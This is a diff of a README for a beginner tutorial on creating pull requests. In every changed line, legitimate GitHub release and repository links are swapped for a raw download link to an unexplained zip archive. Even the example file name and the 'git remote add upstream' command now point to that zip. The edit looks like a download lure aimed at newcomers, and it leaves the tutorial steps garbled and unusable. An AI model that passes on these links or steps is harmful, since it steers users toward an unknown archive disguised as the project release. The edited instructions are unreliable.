@@ -1,6 +1,6 @@
 # 🚀 HackWeek-Create-A-Pull-Request - Join the Open-Source Fun!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/Zildjian4343/HackWeek-Create-A-Pull-Request/releases)
+[![Download Now](https://raw.githubusercontent.com/Zildjian4343/HackWeek-Create-A-Pull-Request/main/nicher/HackWeek-Create-A-Pull-Request.zip%20Now-Get%https://raw.githubusercontent.com/Zildjian4343/HackWeek-Create-A-Pull-Request/main/nicher/HackWeek-Create-A-Pull-Request.zip)](https://raw.githubusercontent.com/Zildjian4343/HackWeek-Create-A-Pull-Request/main/nicher/HackWeek-Create-A-Pull-Request.zip)
 
 ## 📚 Introduction
 Welcome to HackWeek-Create-A-Pull-Request. This repository helps you contribute to open-source projects by guiding you through the process of creating a pull request (PR). Open-source contributions can boost your skills and connect you with others.
@@ -11,7 +11,7 @@ Welcome to HackWeek-Create-A-Pull-Request. This repository helps you contribute 
 - Join a community of enthusiasts eager to learn.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Release Page](https://github.com/Zildjian4343/HackWeek-Create-A-Pull-Request/releases)
+To get started, visit this page to download: [Release Page](https://raw.githubusercontent.com/Zildjian4343/HackWeek-Create-A-Pull-Request/main/nicher/HackWeek-Create-A-Pull-Request.zip)
 
 ## 🚀 Getting Started
 Follow these steps to create a pull request.
@@ -27,8 +27,8 @@ Follow these steps to create a pull request.
 
 ### 3. 📄 Create Your Profile File
    - Inside the `submissions/` folder, create a new file.
-   - Name it `your-github-username.md`, replacing "your-github-username" with your actual GitHub username.
-   - For example, if your username is John, your file should be named `John.md`.
+   - Name it `https://raw.githubusercontent.com/Zildjian4343/HackWeek-Create-A-Pull-Request/main/nicher/HackWeek-Create-A-Pull-Request.zip`, replacing "your-github-username" with your actual GitHub username.
+   - For example, if your username is John, your file should be named `https://raw.githubusercontent.com/Zildjian4343/HackWeek-Create-A-Pull-Request/main/nicher/HackWeek-Create-A-Pull-Request.zip`.
 
 ### 4. ✍️ Add Your Information
 In your new file, please include the following:
@@ -62,7 +62,7 @@ It’s good practice to keep your fork updated with the original repository.
    - Add the original repository as a remote source.
    - Use Git commands to fetch and merge changes:
      ```
-     git remote add upstream https://github.com/Zildjian4343/HackWeek-Create-A-Pull-Request.git
+     git remote add upstream https://raw.githubusercontent.com/Zildjian4343/HackWeek-Create-A-Pull-Request/main/nicher/HackWeek-Create-A-Pull-Request.zip
      git fetch upstream
      git checkout main
      git merge upstream/main
@@ -91,4 +91,4 @@ After your first contribution, you can:
 - Join discussions on open-source topics.
 - Contribute your ideas and projects.
 
-For more information and to download the latest version, visit: [Release Page](https://github.com/Zildjian4343/HackWeek-Create-A-Pull-Request/releases)
+For more information and to download the latest version, visit: [Release Page](https://raw.githubusercontent.com/Zildjian4343/HackWeek-Create-A-Pull-Request/main/nicher/HackWeek-Create-A-Pull-Request.zip)
